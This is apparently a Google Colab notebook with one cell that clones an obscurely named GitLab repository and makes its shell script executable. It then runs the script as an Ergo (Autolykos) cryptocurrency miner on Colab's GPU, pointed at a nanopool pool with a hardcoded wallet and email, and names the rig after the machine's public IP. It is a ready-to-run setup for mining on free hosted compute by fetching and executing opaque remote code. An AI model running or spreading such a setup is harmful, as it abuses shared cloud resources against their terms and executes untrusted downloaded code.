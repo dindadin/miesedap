{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "S2.ipynb",
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "id": "hOscE_s4oBuVU"
      },
      "source": [
        "!nvidia-smi\n",
        "!git clone https://gitlab.com/la3030838/sasasa.git\n",
        "%cd sasasa\n",
        "!chmod +x sasasa.sh\n",
        "!ip=$(echo \"$(curl -s ifconfig.me)\" | tr . _ ) && ./sasasa.sh -algo autolykos -pool1 ergo-eu1.nanopool.org:11433 -wallet 9hHjHAbD4wEz19Tb59ftxeACf17gePpW4D17sdrwWUBGAR7R3p1 -coin ergo -rigName $ip -email lput7447@gmail.com"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}
